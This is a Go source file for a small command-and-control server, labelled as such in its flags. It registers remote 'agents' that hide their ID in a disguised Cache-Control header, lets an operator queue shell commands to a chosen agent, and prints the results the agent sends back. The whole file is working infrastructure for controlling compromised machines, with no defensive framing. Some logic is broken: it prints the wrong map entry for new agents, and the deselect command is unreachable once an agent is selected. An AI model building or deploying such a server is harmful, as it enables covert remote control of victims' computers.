package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"slices"
	"strings"
	"sync"
)

const (
	agentIdHeaderPrefix = "max-age="
)

func getAgentId(r *http.Request) string {
	return strings.TrimPrefix(r.Header.Get("Cache-Control"), agentIdHeaderPrefix)
}

var (
	agents          = []string{}
	agentIdToIpMap  = map[string]string{}
	agentsMux       = &sync.Mutex{}
	selectedAgentID = ""
	currentCommand  = ""
)

func agentExists(id string) bool {
	agentsMux.Lock()
	defer agentsMux.Unlock()
	return slices.Contains(agents, id)
}

func addAgent(id, ip string) {
	agentsMux.Lock()
	defer agentsMux.Unlock()
	agents = append(agents, id)
	agentIdToIpMap[id] = ip
	fmt.Print("new agent: ", id, agentIdToIpMap[ip]+"\n _> ")
}

func main() {
	host := flag.String("host", "0.0.0.0", "host of the c2 server")
	port := flag.String("port", "8080", "port of the c2 server")

	flag.Parse()

	r := http.NewServeMux()

	r.HandleFunc("GET /v1", func(w http.ResponseWriter, r *http.Request) {
		id := getAgentId(r)
		if !agentExists(id) {
			addAgent(id, r.RemoteAddr)
		}

		if len(selectedAgentID) == 0 || len(currentCommand) == 0 {
			return
		}

		w.Write([]byte(currentCommand))
		currentCommand = ""
	})

	r.HandleFunc("POST /v1", func(w http.ResponseWriter, r *http.Request) {
		id := getAgentId(r)

		if selectedAgentID != id {
			return
		}

		response, err := io.ReadAll(r.Body)
		if err != nil {
			fmt.Println("error while reading response from agent:", err)
			return
		}

		fmt.Print("\n" + string(response) + "\n _> ")
	})

	go func() {
		if err := http.ListenAndServe(net.JoinHostPort(*host, *port), r); err != nil {
			panic(err)
		}
	}()

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print(" _> ")
		input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("error reading command line:", err)
			continue
		}
		input = strings.TrimSpace(input)

		if len(selectedAgentID) != 0 {
			currentCommand = input
			continue
		}

		if input == "--list" {
			for i, agentID := range agents {
				fmt.Println(i+1, agentID, agentIdToIpMap[agentID])
			}
			continue
		}

		if strings.HasPrefix(input, "--id") {
			agentID := strings.TrimPrefix(input, "--id ")
			selectedAgentID = agentID
			fmt.Println("agent selected:", agentID, agentIdToIpMap[agentID])
			continue
		}

		if input == "--" {
			currentCommand = ""
			selectedAgentID = ""
			fmt.Print("agent deselected\n _> ")
			continue
		}
	}
}
